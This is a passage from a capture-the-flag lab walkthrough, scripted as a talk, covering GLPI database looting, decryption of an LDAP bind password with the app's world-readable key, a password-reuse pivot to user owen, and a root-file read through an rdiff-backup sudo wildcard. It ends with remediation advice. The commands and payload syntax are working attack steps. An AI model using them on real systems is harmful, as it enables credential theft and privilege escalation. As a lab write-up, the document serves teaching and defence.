SHOW TABLES LIKE '%user%';
SHOW TABLES LIKE '%ldap%';
SELECT id, name, password FROM glpi_users;
SELECT * FROM glpi_authldaps\G
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> The first two commands list tables related to users and to the directory. Then we pull the user table, and finally we read the directory settings row in full with that backslash-G, which just prints it as a clean top-to-bottom list instead of a squashed row.


**Result (key fields):**

```
# glpi_users -> bcrypt $2y$10$ hashes (rabbit hole: strong, uncrackable, and app-only)

# glpi_authldaps
name:          Management Directory
host:          sso.management.htb      port: 389
rootdn:        cn=svc-glpi,ou=services,dc=management,dc=htb
rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] The user table shows password hashes, scrambled passwords. Those are a deliberate time-sink on this box, strong and not crackable, so we note them and move on. The real prize is in the directory settings: a stored bind password, the password GLPI uses to connect to the company directory. It is encrypted, but remember, we already have the key to that encryption sitting on disk.
>
> **CONCEPT BOX — hashes versus reversible encryption:** Plain version: a hash is a one-way scramble you can only crack by guessing, while reversible encryption can be unlocked if you have the key. The user passwords here are hashed and hopeless, but the directory password is merely encrypted and we hold the key. Depth line: the hashes are bcrypt at a strong cost, so brute force is off the table, which is exactly why the author put the real path behind the recoverable key. Real world: knowing which protection you face decides whether cracking is even worth attempting.
>
> **PRONOUNCE:** LDAP = say L-DAP. bcrypt = say B-crypt. rootdn = say root-D-N.
>
> **TRANSITION:** We have the encrypted password and we know the key is on disk. Let us unlock it.

**What this gives you:** An encrypted LDAP bind password for the `svc-glpi` service account. **Key finding:** `rootdn_passwd` is a base64 blob encrypted with XChaCha20-Poly1305 using the world-readable `glpicrypt.key`, so it is fully recoverable. The `glpi_users` bcrypt hashes are a deliberate dead end. (Dead end recorded: bcrypt cost-10 hashes with strong passwords, not crackable, and not mapped to Linux users.)

**Next:** Decrypt `rootdn_passwd` using GLPI’s own key and code.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 4.5 Decrypt the LDAP bind password

**Why this step:** The `rootdn_passwd` blob is reversibly encrypted with the world-readable `glpicrypt.key`. Decrypt it using GLPI’s own key-handling code.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> The lazy, elegant way to decrypt this is to ask the application to do it for us. GLPI's own code and its key are right here on the box, so we simply borrow its decryption function and feed it the locked password.

**Command:**

```shell
cd /opt/glpi
php -r '
define("GLPI_CONFIG_DIR", "/opt/glpi/config");
require "vendor/autoload.php";
require "src/GLPIKey.php";
$key = new GLPIKey();
echo $key->decrypt("avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==") . PHP_EOL;
'
```


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> This short PHP snippet points at GLPI's config folder, loads GLPI's own key-handling code, and calls its decrypt function on the locked password. Because GLPI's code reads the on-disk key itself, we do not even touch the key directly, we just let the app unlock its own secret.

**Breakdown:**

- `define("GLPI_CONFIG_DIR", ...)` points GLPI at its config directory (where `glpicrypt.key` lives).
- `require` loads GLPI’s Composer autoloader and the `GLPIKey` class.
- `$key->decrypt(...)` reverses the XChaCha20-Poly1305 encryption using the on-disk key.

**Result:**

```
WpczC40GhTbk
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point, but do not read the value aloud.] Out comes the directory bind password in plain text. We now hold a real, human-looking password that the admin chose. The obvious next question is the one lazy admins always answer for us: did they reuse it anywhere.
>
> **PRONOUNCE:** PHP = say P-H-P.
>
> **TRANSITION:** Our target is the user owen. Let us test whether this password was reused for his account.

**What this gives you:** The cleartext bind password for `svc-glpi`. **Key finding:** the LDAP bind password is `WpczC40GhTbk`, recovered by abusing GLPI’s own decryption routine against its world-readable key.

**Next:** Test this password for reuse against the local user `owen`.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 4.6 Pivot to owen via password reuse and capture user.txt

**Why this step:** The decrypted LDAP bind password may be reused by a local account. Test it against `owen`, the user-flag holder.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> This is the human weakness the whole middle of the box is built on. An admin set up the directory connection, typed a password they already use, and moved on. We are going to try that exact password to switch into owen's account.

**Command:**

```shell
su owen
# password: WpczC40GhTbk
id
cat ~/user.txt
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> su owen asks to switch to the owen user, and it prompts for owen's password, where we paste the one we just decrypted. If it accepts, we run id to confirm who we are, then read the user flag file from owen's home.


**Result:**

```
owen@management:/opt/glpi$ id
# uid=1000(owen) gid=1000(owen) groups=1000(owen)
```

```
USER FLAG: ab1fe37172d2bc2f357fd35f091be442
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point at id. Do not read the flag value aloud.] It worked, we are now owen, a real user, and with that we capture the user flag. Stand back and look at the chain: web exploit, read a config, dump a database, decrypt a password with a key left on disk, and one reused password turned all of that into a real account.
>
> **CONCEPT BOX — why password reuse is so dangerous:** Plain version: using the same password in two places means cracking it once unlocks both, so one leak becomes many. Depth line: here a service account's directory bind password doubled as a human's system login, collapsing two trust boundaries into one. Real world: credential reuse is behind a huge share of real breaches, which is exactly why password managers and unique passwords matter.
>
> **PRONOUNCE:** su = say S-U or switch user. user.txt = say user-dot-text.
>
> **TRANSITION and PHASE 4 RECAP:** Where are we now? We looted a second app's config, pulled its database, decrypted a stored password, and rode password reuse into the real user owen, grabbing the user flag. Lateral movement done. One step left: becoming root.

**What this gives you:** An interactive session as the human user `owen`. **Key finding:** the LDAP bind password `WpczC40GhTbk` was reused as `owen`’s local account password, completing the pivot from the `openam` service account to a real user. This single instance of password reuse was worth more than every uncrackable bcrypt hash in the database.

**Next:** Enumerate `owen`’s privileges, starting with sudo rights.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc

### 5.1 Enumerate sudo rights

**Why this step:** The first privilege-escalation check for any new user is their sudo permissions.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> First thing on any new account: ask what this user is allowed to run with admin power. One command answers it, and on this box that single answer is the entire path to root.

**Command:**

```shell
sudo -l
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> sudo dash l simply lists what commands owen may run as the root administrator, and whether it needs a password. Read the output carefully, because the important detail is going to look harmless at first glance.


**Result:**

```
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup
        --restrict-mode read-only *
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] Owen may run a backup tool, rdiff-backup, as root with no password. It even looks locked down, restricted to read-only and to one backup folder. But look at the very end of the line: a star. That star means owen can add extra options of his own onto the end, and that one character is the whole vulnerability.
>
> **CONCEPT BOX — what sudo is:** Plain version: sudo is the Linux way to let a normal user run one specific thing with administrator power, like a keycard that opens exactly one door. The risk is when that one door is wider than the admin realized. Depth line: the sudoers rule only matches a fixed command prefix, so the trailing wildcard lets us append arguments that change the tool's behavior entirely. Real world: sudo misconfigurations are one of the most common Linux privilege-escalation routes, catalogued on sites like GTFOBins.
>
> **PRONOUNCE:** sudo = say soo-doo or sudo. rdiff-backup = say R-diff backup. sudoers = say sudo-ers.
>
> **TRANSITION:** That wildcard is our opening. Let us quickly check the tool's version so we use the right syntax, then exploit it.

**What this gives you:** 

- A passwordless root sudo entry for `rdiff-backup` in server mode. 
- **Key finding:** the rule ends in a wildcard (`*`), allowing arbitrary extra arguments to be appended to a root-run `rdiff-backup --server` invocation. Combined with rdiff-backup’s “last option wins” parsing and its `--remote-schema` feature, this is exploitable for full root file access.
<div align="center">
<br>
<br>
</div>

#### What's rdiff?

**rdiff-backup** is a mature open-source backup tool (around since ~2001, written in Python). It makes incremental backups using the rsync algorithm: it keeps a full mirror of the current state plus reverse diffs, so you can restore any previous version without storing full copies each time. It’s genuinely used in production environments, which is what makes this privesc realistic.

The part we’re abusing is its client/server design: `rdiff-backup` can back up a remote machine by launching a helper process (`--server`) over a transport, normally SSH. The command it uses to launch that helper is the `--remote-schema`, and by default it’s something like `ssh %s rdiff-backup --server`. That override hook plus the sudo wildcard is the whole bug. The tool is legit; the sudoers rule wrapping it is the misconfiguration.
<div align="center">
<br>
<br>
</div>

#### Why this sudo rule is exploitable

The rule intends to let `owen` serve read-only backups from `/opt/backup`. Three rdiff-backup behaviors defeat that intent:

- **Wildcard append:** sudo only matches the fixed prefix; the trailing `*` permits appending flags such as a second `--restrict-path`.
- **Last-value-wins parsing:** rdiff-backup stores each `--restrict-path` in turn, and the final one is enforced. Appending `--restrict-path /` replaces the `/opt/backup` scope with the whole filesystem.
- **`--remote-schema` injection:** rdiff-backup launches its remote server via a schema command you can override. By setting the schema to `sudo /usr/bin/rdiff-backup --server ... --restrict-path /`, the root-run server enforces `/` as its read-only scope, and the client can then mirror any root-owned path (for example `/root`) into a writable directory.

**Next:** Confirm the rdiff-backup version to use the correct `--remote-schema` placeholder syntax, then execute.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 5.2 Exploit the rdiff-backup sudo rule and capture root.txt

**Why this step:** The sudo rule permits a root-run `rdiff-backup --server` with appended arguments. Override its restriction scope via the wildcard and `--remote-schema` to read root-owned files.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Here is the trick, and it is beautiful because we never break the rules, we just re-declare them. The backup tool can launch a helper process, and it lets us define the command used to launch it. We hijack that to launch the helper as root and quietly widen its read-only scope from one folder to the entire filesystem. Then we tell it to copy the root user's private folder to a place we can read.

**Command:**

```shell
rm -rf /tmp/rdb && mkdir -p /tmp/rdb
rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / # {h}' \
  'localhost::/root' \
  /tmp/rdb
```


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> We make a temporary folder we own, then run the backup tool. The important piece is the launch-command override: we set it to the allowed sudo command, but we tack on a second scope of the whole filesystem at the end, which the wildcard permits, and the tool keeps the last scope it sees. A little comment trick hides the leftover hostname. Then we point it at the root user's folder as the source and our temporary folder as the destination.

**Breakdown:**

- `--remote-schema '...'` replaces the server-launch command; set to a `sudo` call so the server runs as root.
- `{h}` (the 2.x host placeholder) sits after `#`, so the substituted hostname is shell-commented away. The effective server command is `sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /`.
- sudo matches the allowed prefix; the appended `--restrict-path /` rides the wildcard and, by last-value-wins parsing, becomes the enforced (root-readable) scope.
- `'localhost::/root'` is the source mirrored by that root server; `/tmp/rdb` is the owen-writable destination.

**Result (version note: rdiff-backup 2.2.6 uses `{h}`, not the writeup’s `%s`):**

```
NOTE: Starting mirror from source path /root to destination path /tmp/rdb
# /tmp/rdb now contains root's home, owned by owen
```

```
ROOT FLAG: 9d9336405d857be3d52613f878217ee9
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point. Do not read the flag value aloud.] It reports it is mirroring the root folder into our directory, and now root's private files, owned by us, are sitting in that temp folder. We read the root flag straight out of it. And that is root. No root password, no root shell even, just a backup tool trusted one wildcard too far.
>
> **CONCEPT BOX — the three-part sudo wildcard abuse:** Plain version: one, the star lets us add our own options. Two, the tool obeys the last scope it is given, so our added one wins. Three, the tool lets us choose how its helper launches, so we launch it as root. Put together, a read-only backup of one folder becomes a root-level read of everything. Depth line: last-option-wins parsing plus an override hook plus a permissive sudoers wildcard is the exact combination, none dangerous alone. Real world: this is why least-privilege sudo rules should pin full, exact arguments and never end in a wildcard.
>
> **PRONOUNCE:** rdiff-backup = say R-diff backup. remote-schema = say remote schema.
>
> **TRANSITION and PHASE 5 RECAP:** Where are we now? We abused one over-trusted backup command to read the root user's files and capture the root flag. The box is fully owned, recon to root.

**What this gives you:** Arbitrary root-file read as `owen`, used to exfiltrate `/root`. **Key finding:** full root-level file disclosure via sudo wildcard plus rdiff-backup `--remote-schema` injection, no root shell or password required.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Transferable Takeaways

1. Always full-port scan. The entire box lived on non-default ports (OpenAM on 50389/4444/RMI); a top-1000 scan would have missed it.
2. Version disclosure is everywhere. A cache-busting `?v=16.0.5` turned a product into a specific, exploitable CVE.
3. Triage CVEs by reachability, not severity. Three “critical RCE” advisories existed; only the one hitting a default-enabled endpoint mattered.
4. Match your toolchain to the target. Compiling the deserialization payload under the wrong JDK fails silently; JDK 21 was mandatory.
5. Client-side encryption is not protection. A key the browser holds is a key you hold; the same logic broke GLPI’s `glpicrypt.key`.
6. Password reuse is the cheapest, most reliable pivot. One recycled password beat a table of uncrackable bcrypt hashes.
7. Wildcards in sudo rules are near-always exploitable. A trailing `*` plus a tool that honors “last option wins” equals full privilege escalation.

> [!tip]+ 🎤 CLOSING — SAY THIS AT THE END
>
> **THE STORY:** Let us zoom out and tell the whole story in one breath. We got onto the network and found the box ran an old identity product on an odd port. A hidden version number pointed us at a known pre-auth flaw, which handed us a shell with no password. From there we read a second app's config that anyone could read, pulled its database, and decrypted a stored password using a key the app left lying on disk. That password had been reused for a real user. And that real user was trusted to run a backup tool with one wildcard too many, which we turned into reading root's files. Five human mistakes, chained.
>
> **LESSONS:** Three things to take home. One, exact version numbers are gold, because they turn guessing into looking up a known exploit. Two, encryption is worthless if the key sits next to the locked data, and reused passwords multiply every single leak. Three, trusting a flexible command with sudo, especially with a wildcard, is one of the easiest ways to hand away root.
>
> **HONEST CALLBACK:** I called this a web exploitation box, and the way in truly was. But be honest with the room: the middle was really a credential-hunting and basic-cryptography exercise, and the finish was careful reading of a permissions rule, not another exploit. Recognizing the three deliberate decoys, the fake encrypted site, the uncrackable hashes, and the scary-named monitoring folders, was as much the test as the real path.
>
> **Q&A PREP:** [Likely questions and tight answers.] Do we need to crack those hashes? No, they are a deliberate dead end, the real password came from the directory settings. Why Java 21 specifically? Because the target runs an older Java and refuses anything compiled newer. Did we get a root shell? No, we got root-level file read, which was enough for the flag, and the same trick could grab root's SSH key for a full shell. Is this a real product? Yes, OpenAM and GLPI are both real and used in production, which is what makes the box realistic. [Two graceful deflections:] Good question, that goes a bit beyond what I tested here, let me follow up after. I am not fully sure on that one, I would rather check than guess, catch me at the end.
>
> **DELIVERY CUES:** [If a command hangs or the box is slow:] These labs share bandwidth, so give it a second, this is a good moment to recap what we are looking for. [If the exploit output looks like an error:] Remember, on this flaw we trust the listener, not the script, so watch this other window. [Do not] re-run the exploit many times or close the VPN or listener windows mid-demo. [Pause and breathe after the foothold and again after reaching owen.]

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations

**7.1 OpenAM deserialization RCE (CVE-2026-33439).** Untrusted Java deserialization of `jato.clientSession` with no class allow-list grants pre-auth RCE. Dangerous because it needs no credentials and yields immediate code execution. Fix: upgrade OpenAM past the patched release, extend the `WhitelistObjectInputStream` filter to `jato.clientSession`, and disable or block the legacy JATO ViewBean endpoints if unused.

**7.2 World-readable GLPI secrets.** `config_db.php` and `glpicrypt.key` were world-readable, and the decryption key sat beside the ciphertext. Dangerous because any local user recovers database and LDAP credentials. Fix: set these files to `640 www-data:www-data`, store `glpicrypt.key` outside the web tree with strict permissions, and rotate both the key and all secrets it ever encrypted.

**7.3 Reusable / shared passwords.** The LDAP bind password doubled as `owen`’s system password. Dangerous because one leaked secret compromises multiple identities. Fix: enforce unique per-account credentials, use a secrets manager for service binds, and rotate any credential that appears in more than one place.

**7.4 rdiff-backup sudo wildcard.** The sudo rule ended in `*`, letting `owen` append arguments to a root-run command. Dangerous because it defeats the tool’s own restriction flags and yields root file access. Fix: remove the trailing wildcard and specify exact, complete arguments, or replace the interactive sudo grant with a fixed root-run systemd service/timer that `owen` cannot parameterize.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

